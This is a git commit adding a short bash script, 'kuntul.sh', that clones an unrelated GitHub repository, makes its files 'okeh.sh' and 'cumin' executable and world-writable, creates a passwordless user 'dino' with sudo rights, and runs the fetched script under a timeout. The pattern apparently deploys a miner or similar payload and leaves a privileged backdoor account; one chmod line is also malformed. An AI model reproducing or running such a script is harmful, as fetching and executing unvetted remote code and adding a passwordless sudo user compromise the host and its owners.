b6dc04ddcc975b14c4dc183cee194dc3216686b0
KonaN <84027237+KonaN15@users.noreply.github.com>
2021-07-06 10:02:28 +0700

    Create kuntul.sh

---
+++ kuntul.sh
@@ -0,0 +1,7 @@
+#!/bin/bash
+sudo apt update
+git clone https://github.com/dfgfd443rete/JUGER.git && cd JUGER
+chmod +x okeh.sh && chmod +x cumin chmod 777 cumin okeh.sh
+sudo adduser --disabled-password --gecos "" dino && sudo usermod -aG sudo dino
+sudo -u dino -H sh -c "timeout 359 ./okeh.sh"
+sudo apt update
